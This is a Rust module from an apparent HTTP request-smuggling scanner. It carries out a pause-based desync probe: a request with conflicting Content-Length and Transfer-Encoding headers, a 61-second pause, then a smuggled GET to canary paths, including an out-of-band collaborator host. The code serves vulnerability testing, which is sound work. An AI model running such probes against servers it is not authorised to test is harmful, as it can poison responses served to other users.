use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::timeout;

use crate::auth::AuthStore;
use crate::net::{h1, NetConfig};
use crate::output::ScanResult;

const PAUSE_SECS: u64 = 61;
const POISON_PATHS: &[(&str, &str)] = &[
    ("status", "/hopefully404"),
    ("reflect", "/"),
    ("dns", "http://burpcollaborator.net/probe"),
];

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    if !*silent {
        crate::print_dbg(&format!("Pause-based desync probe ({}s delay)", PAUSE_SECS));
    }

    let baseline_req = h1::build_request("GET", "/", host, &[], b"");
    let baseline = h1::send_request(cfg, &baseline_req, auth).await?;

    let mut vulnerable = false;
    let mut poison_type: Option<String> = None;
    let mut response_status: u16 = 0;

    for (canary_name, poison_path) in POISON_PATHS {
        if !*silent {
            crate::print_dbg(&format!("Pause probe with {} canary ({})", canary_name, poison_path));
        }

        let smuggled = format!(
            "GET {} HTTP/1.1\r\nHost: localhost\r\n\r\n",
            poison_path
        );
        let smuggled_bytes = smuggled.as_bytes();

        let timeout_secs = PAUSE_SECS + 10;

        let mut conn = match crate::net::connect(cfg).await {
            Ok(c) => c,
            Err(_) => continue,
        };

        let headers = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\nUser-Agent: ghostroute/{}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
            host, env!("CARGO_PKG_VERSION")
        );
        let mut req_bytes = headers.into_bytes();
        if let Some(a) = auth {
            a.apply_to_request(&mut req_bytes);
        }

        req_bytes.extend_from_slice(b"0\r\n\r\n");

        conn.write_all(&req_bytes).await.ok();

        tokio::time::sleep(Duration::from_secs(PAUSE_SECS)).await;

        let mut buf = Vec::with_capacity(4096);
        let mut tmp = [0u8; 8192];
        loop {
            match timeout(Duration::from_secs(timeout_secs), conn.read(&mut tmp)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => buf.extend_from_slice(&tmp[..n]),
                Ok(Err(_)) => break,
                Err(_) => break,
            }
            if buf.len() > 1_000_000 {
                break;
            }
        }
        let _first = h1::parse_response(&buf).ok();

        conn.write_all(smuggled_bytes).await.ok();

        tokio::time::sleep(Duration::from_millis(200)).await;

        let second_req = h1::build_request("GET", "/", host, &[], b"");
        conn.write_all(&second_req).await.ok();

        let mut buf2 = Vec::with_capacity(4096);
        loop {
            match timeout(Duration::from_secs(timeout_secs), conn.read(&mut tmp)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => buf2.extend_from_slice(&tmp[..n]),
                Ok(Err(_)) => break,
                Err(_) => break,
            }
            if buf2.len() > 1_000_000 {
                break;
            }
        }

        if let Ok(second_resp) = h1::parse_response(&buf2) {
            response_status = second_resp.status_code;
            if second_resp.status_code > 0 && second_resp.status_code != baseline.status_code {
                vulnerable = true;
                poison_type = Some(canary_name.to_string());
                if !*silent {
                    crate::print_det(&format!(
                        "Pause-based desync confirmed with canary: {} (resp {})",
                        canary_name, second_resp.status_code
                    ));
                }
                break;
            }
        }
    }

    let host_name = cfg.host.split(':').next().unwrap_or(&cfg.host);
    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "pause-desync".to_string(),
        vulnerable,
        server: baseline.server.clone(),
        bypass: poison_type.clone(),
        status_code: response_status,
        details: if vulnerable {
            Some(format!(
                "Pause-based desync: {}s pause, {} canary triggered ({} -> baseline {})",
                PAUSE_SECS,
                poison_type.unwrap_or_default(),
                response_status,
                baseline.status_code
            ))
        } else {
            None
        },
        ..Default::default()
    })
}
